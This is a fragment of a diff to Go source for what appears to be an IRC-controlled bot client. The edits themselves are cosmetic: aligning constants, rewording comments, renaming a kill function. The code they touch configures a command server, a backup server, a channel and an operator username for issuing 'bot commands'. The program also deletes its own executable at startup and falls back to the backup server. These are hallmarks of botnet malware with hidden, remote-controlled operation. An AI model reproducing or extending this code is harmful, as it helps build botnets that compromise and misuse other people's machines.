@@ -11,12 +11,12 @@ import (
 )
 
 const (
-	IRC_SERVER = "" //Config IRC server and port here. ~> IP:port ~> "127.0.0.1:6667"
+	IRC_SERVER        = "" //Config IRC server and port here. --> IP:port --> "127.0.0.1:6667"
 	IRC_BACKUP_SERVER = "" //Config like the main server, if you didn't have it just leave it blank.
-	IRC_CHANNEL = "" //Config channel here. ~> "#Example"
-	IRC_CHANNEL_KEY = "" //Config channel key here, if you didn't have it just leave it blank.
-	IRC_USERNAME = "" //Config your IRC username here, for access to your bot commands.
-	IRC_BOT_TAG = "" //Config your bot tag here. ~> "EXAMPLE" ~> [EXAMPLE][A][1234567]
+	IRC_CHANNEL       = "" //Config channel here. --> "#Example"
+	IRC_CHANNEL_KEY   = "" //Config channel key here, if you didn't have it just leave it blank.
+	IRC_USERNAME      = "" //Config your IRC username here, for access to your bot commands.
+	IRC_BOT_TAG       = "" //Config your bot tag here. --> "EXAMPLE" --> [EXAMPLE][A][1234567]
 )
 
 func run(server string) error {
@@ -47,7 +47,7 @@ func run(server string) error {
 		}()
 
 		/*
-			Check is user modes and join IRC channel
+			Check is user modes and join IRC channel.
 		*/
 		if lib.Find(ircRead, "+i") || lib.Find(ircRead, "+w") || lib.Find(ircRead, "+x") {
 			b.Send(fmt.Sprint("JOIN " + IRC_CHANNEL + IRC_CHANNEL_KEY))
@@ -69,7 +69,7 @@ func main() {
 	os.Remove(os.Args[0])
 	if run(IRC_SERVER) != nil {
 		if IRC_BACKUP_SERVER == "" {
-			lib.Kill()
+			lib.KILL()
 		}
 		for {
 			if run(IRC_BACKUP_SERVER) == nil {
